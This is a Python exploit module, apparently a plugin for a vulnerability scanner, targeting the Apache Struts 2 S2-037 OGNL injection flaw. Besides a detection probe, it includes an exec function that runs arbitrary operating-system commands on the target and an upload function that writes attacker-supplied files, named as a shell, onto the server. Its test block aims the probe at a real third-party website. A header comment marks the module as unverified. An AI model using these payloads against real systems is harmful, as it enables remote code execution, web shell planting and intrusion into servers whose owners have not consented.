#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

'''
S2_037 未验证
'''
def info(data=None):
    info = {
        "name": "Struts 2-037",
        "info": "Struts 2-037",
        "level": "high",
        "type": "rec",
    }
    return info

def prove(data):
    data = init(data, 'struts')
    if data['url'] != None:
        prove_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#w.print(#parameters.web[0]),#w.print(#parameters.path[0]),#w.close()):xx.toString.json?&pp=/&encoding=UTF-8&web=struts2_security_vul&path=struts2_security_vul_str2037'''
        poc_key = "struts2_security_vul"
        try:
            headers = {'Content-Type': "application/x-www-form-urlencoded"}
            res = curl('get', data['url'], params=prove_poc, headers=headers)
            if poc_key in res.headers or poc_key in res.text:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": 'struts2_037'})
        except:
            pass
    return data


def exec(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        cmd = data['cmd']
        exec_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close()):xx.toString.json&cmd=%COMMAND%&pp=\\\\AAAA&ppp= &encoding=UTF-8'''
        headers = {}
        try:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            res = curl('get', data['url'], params=exec_poc.replace("%COMMAND%", cmd)).text
            data['flag'] = 1
            data['data'].append({"poc": exec_poc})
            data['res'].append({"info": res, "key": cmd})
        except:
            pass
    return data



def upload(data=None):
    data = init(data, 'struts')
    if data['url'] != None:
        upload_poc = '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#path=#req.getRealPath(#parameters.pp[0]),new java.io.BufferedWriter(new java.io.FileWriter(#parameters.shellname[0]).append(#parameters.shellContent[0])).close(),#w.print(#parameters.info1[0]),#w.print(#parameters.info2[0]),#w.print(#req.getContextPath()),#w.close()):xx.toString.json&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=/&info1=oko&info2=kok/'''
        despath = data['despath']
        content = _read_file(data['srcpath'])
        headers =  {}
        try:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            curl('get', data['url'],params=upload_poc.replace("%PATH%", despath).replace("%FILECONTENT%", content),headers=headers)
            data['flag'] = 1
            data['data'].append({"poc": upload_poc})
            data['res'].append({"info": despath, "key": 'upload'})
        except:
            pass

    return data


def _read_file(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))